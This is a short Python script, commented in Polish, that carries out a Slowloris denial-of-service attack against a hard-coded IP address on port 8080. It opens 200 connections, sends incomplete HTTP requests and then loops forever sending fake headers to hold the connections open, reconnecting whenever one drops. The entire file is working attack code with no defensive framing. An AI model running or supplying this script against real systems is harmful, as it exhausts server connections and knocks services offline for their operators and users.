import socket
import time
import random

target_host = '212.182.24.27'
target_port = 8080
num_sockets = 200
sleep_time = 15

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((target_host, target_port))
    s.sendall(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n".encode('utf-8'))
    return s

sockets = []

print(f"[+] Tworzenie {num_sockets} połączeń...")
for _ in range(num_sockets):
    try:
        s = create_socket()
        sockets.append(s)
    except socket.error as e:
        print(f"[!] Błąd przy tworzeniu gniazda: {e}")
        break

print("[+] Wszystkie połączenia zostały wysłane. Rozpoczynamy atak Slowloris...")

while True:
    print(f"[+] Wysyłanie fałszywych nagłówków do {len(sockets)} połączeń...")
    for s in list(sockets):
        try:
            header = f"X-a{random.randint(1, 5000)}: b\r\n"
            s.sendall(header.encode('utf-8'))
        except socket.error:
            sockets.remove(s)
            try:
                new_socket = create_socket()
                sockets.append(new_socket)
            except socket.error:
                pass
    time.sleep(sleep_time)
